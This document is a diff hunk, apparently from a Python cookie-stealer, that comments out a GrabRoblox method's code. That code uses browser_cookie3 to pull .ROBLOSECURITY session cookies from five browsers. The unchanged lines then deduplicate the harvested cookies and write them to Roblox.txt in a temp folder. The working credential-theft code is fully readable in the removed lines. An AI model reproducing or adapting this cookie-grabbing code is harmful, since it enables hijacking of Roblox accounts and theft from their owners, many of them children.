@@ -352,31 +352,31 @@ class main():
 			if open(f, 'r') == "": os.remove(os.path.join(self.tempfolder, f))
 
 	def GrabRoblox(self):
-		try:
-			cookie = browser_cookie3.brave(domain_name='roblox.com')
-			if not cookie in self.roblosecurity:
-				self.roblosecurity.append(str(cookie).split(".ROBLOSECURITY=")[1].split(" for .roblox.com")[0])
-		except: pass
-		try:
-			cookie = browser_cookie3.chrome(domain_name='roblox.com')
-			if not cookie in self.roblosecurity:
-				self.roblosecurity.append(str(cookie).split(".ROBLOSECURITY=")[1].split(" for .roblox.com")[0])
-		except: pass
-		try:
-			cookie = browser_cookie3.edge(domain_name='roblox.com')
-			if not cookie in self.roblosecurity:
-				self.roblosecurity.append(str(cookie).split(".ROBLOSECURITY=")[1].split(" for .roblox.com")[0])
-		except: pass
-		try:
-			cookie = browser_cookie3.firefox(domain_name='roblox.com')
-			if not cookie in self.roblosecurity:
-				self.roblosecurity.append(str(cookie).split(".ROBLOSECURITY=")[1].split(" for .roblox.com")[0])
-		except: pass
-		try:
-			cookie = browser_cookie3.opera(domain_name='roblox.com')
-			if not cookie in self.roblosecurity:
-				self.roblosecurity.append(str(cookie).split(".ROBLOSECURITY=")[1].split(" for .roblox.com")[0])
-		except: pass
+		#try:
+		#	cookie = browser_cookie3.brave(domain_name='roblox.com')
+		#	if not cookie in self.roblosecurity:
+		#		self.roblosecurity.append(str(cookie).split(".ROBLOSECURITY=")[1].split(" for .roblox.com")[0])
+		#except: pass
+		#try:
+		#	cookie = browser_cookie3.chrome(domain_name='roblox.com')
+		#	if not cookie in self.roblosecurity:
+		#		self.roblosecurity.append(str(cookie).split(".ROBLOSECURITY=")[1].split(" for .roblox.com")[0])
+		#except: pass
+		#try:
+		#	cookie = browser_cookie3.edge(domain_name='roblox.com')
+		#	if not cookie in self.roblosecurity:
+		#		self.roblosecurity.append(str(cookie).split(".ROBLOSECURITY=")[1].split(" for .roblox.com")[0])
+		#except: pass
+		#try:
+		#	cookie = browser_cookie3.firefox(domain_name='roblox.com')
+		#	if not cookie in self.roblosecurity:
+		#		self.roblosecurity.append(str(cookie).split(".ROBLOSECURITY=")[1].split(" for .roblox.com")[0])
+		#except: pass
+		#try:
+		#	cookie = browser_cookie3.opera(domain_name='roblox.com')
+		#	if not cookie in self.roblosecurity:
+		#		self.roblosecurity.append(str(cookie).split(".ROBLOSECURITY=")[1].split(" for .roblox.com")[0])
+		#except: pass
 		res = [*set(self.roblosecurity)]
 		open(os.path.join(self.tempfolder, "Roblox.txt"), 'a').write('\n\n'.join(res))
 	
